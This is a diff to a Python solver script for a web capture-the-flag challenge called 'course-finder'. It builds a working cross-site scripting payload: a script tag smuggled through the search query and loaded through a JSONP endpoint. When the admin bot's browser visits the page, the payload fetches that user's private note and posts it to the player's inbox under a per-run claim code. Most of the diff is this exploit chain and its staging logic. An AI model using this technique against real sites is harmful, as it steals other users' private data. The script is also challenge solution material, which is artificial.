@@ -19,24 +19,24 @@ CHALLENGE_ID = "course-finder"
 
 FLAG = re.compile(r"ingehack\{[^}\r\n]+\}")
 
-# Runs inside the assistant's browser. The endpoint wraps this text in
-# `<callback>({...})`, so the trailing // comments the data out.
-CALLBACK = (
-    "fetch('/api/me/note')"
-    ".then(r=>r.text())"
-    ".then(t=>fetch('/api/inbox',{method:'POST',"
-    "headers:{'Content-Type':'application/x-www-form-urlencoded'},"
-    "body:'to=student&body='+encodeURIComponent(t)}))//"
-)
+def build_callback(claim: str) -> str:
+    """Runs inside the assistant's browser and files her note under the claim."""
+    return (
+        "fetch('/api/me/note')"
+        ".then(r=>r.text())"
+        ".then(t=>fetch('/api/inbox',{method:'POST',"
+        "headers:{'Content-Type':'application/x-www-form-urlencoded'},"
+        "body:'to=" + claim + "&body='+encodeURIComponent(t)}))//"
+    )
 
 
 class SolverError(RuntimeError):
     """The intended path did not produce a flag."""
 
 
-def build_target_url(base_url: str) -> str:
+def build_target_url(base_url: str, claim: str) -> str:
     """The search URL whose query carries a same-origin script into her page."""
-    callback = urllib.parse.quote(CALLBACK, safe="")
+    callback = urllib.parse.quote(build_callback(claim), safe="")
     payload = f'<script src="/api/jsonp?cb={callback}"></script>'
     return base_url + "/search?q=" + urllib.parse.quote(payload, safe="")
 
@@ -63,9 +63,33 @@ def sign_in(base_url: str) -> urllib.request.OpenerDirector:
     return opener
 
 
-def prepare(base_url: str) -> str:
-    sign_in(base_url)
-    return build_target_url(base_url)
+def read_inbox(
+    opener: urllib.request.OpenerDirector,
+    base_url: str,
+    claim: str | None = None,
+) -> tuple[str, str]:
+    """Read the inbox and return its claim code and page."""
+    path = "/inbox"
+    if claim:
+        path += "?claim=" + urllib.parse.quote(claim)
+    try:
+        with opener.open(base_url + path, timeout=10) as response:
+            page = response.read().decode("utf-8", "replace")
+    except urllib.error.URLError as error:
+        raise SolverError(f"cannot read the inbox: {error}") from error
+    match = re.search(r'data-claim="([0-9a-f]{8})"', page)
+    if not match:
+        raise SolverError("the inbox did not carry a claim code")
+    return match.group(1), page
+
+
+def prepare_with(
+    opener: urllib.request.OpenerDirector,
+    base_url: str,
+    claim: str | None = None,
+) -> str:
+    claim, _ = read_inbox(opener, base_url, claim)
+    return build_target_url(base_url, claim)
 
 
 def run_admin_bot(
@@ -125,14 +149,13 @@ def run_admin_bot(
     raise SolverError("the admin bot did not finish in time")
 
 
-def submit(base_url: str) -> None:
-    opener = sign_in(base_url)
-    try:
-        with opener.open(base_url + "/inbox", timeout=10) as response:
-            body = response.read().decode("utf-8", "replace")
-    except urllib.error.URLError as error:
-        raise SolverError(f"cannot read the inbox: {error}") from error
-    match = FLAG.search(body)
+def submit_with(
+    opener: urllib.request.OpenerDirector,
+    base_url: str,
+    claim: str | None = None,
+) -> None:
+    _, page = read_inbox(opener, base_url, claim)
+    match = FLAG.search(page)
     if not match:
         raise SolverError("the note is not in the inbox yet")
     print(match.group(0))
@@ -151,14 +174,28 @@ def main() -> int:
         help="player API token, needed for --stage all; the run-bot form uses the same account",
     )
     parser.add_argument("--challenge-id", default=CHALLENGE_ID)
+    parser.add_argument(
+        "--claim",
+        help="claim code printed by --stage prepare, needed for a two-stage run",
+    )
     args = parser.parse_args()
 
     base_url = args.base_url.rstrip("/")
     try:
         if args.stage == "prepare":
-            print(prepare(base_url))
+            opener = sign_in(base_url)
+            claim, _ = read_inbox(opener, base_url, args.claim)
+            print(prepare_with(opener, base_url, claim))
+            print(f"claim: {claim}", file=sys.stderr)
         elif args.stage == "submit":
-            submit(base_url)
+            if not args.claim:
+                print(
+                    "solver: --stage submit needs --claim from --stage prepare",
+                    file=sys.stderr,
+                )
+                return 2
+            opener = sign_in(base_url)
+            submit_with(opener, base_url, args.claim)
         elif args.stage == "all":
             if not args.platform_url or not args.token:
                 print(
@@ -166,10 +203,13 @@ def main() -> int:
                     file=sys.stderr,
                 )
                 return 2
-            url = prepare(base_url)
+            opener = sign_in(base_url)
+            claim, _ = read_inbox(opener, base_url)
+            print(f"claim: {claim}", file=sys.stderr)
+            url = prepare_with(opener, base_url, claim)
             print(f"bot target: {url}", file=sys.stderr)
             run_admin_bot(args.platform_url, args.token, args.challenge_id, url)
-            submit(base_url)
+            submit_with(opener, base_url, claim)
         else:
             print(
                 "solver: pass --stage prepare, submit, or all",
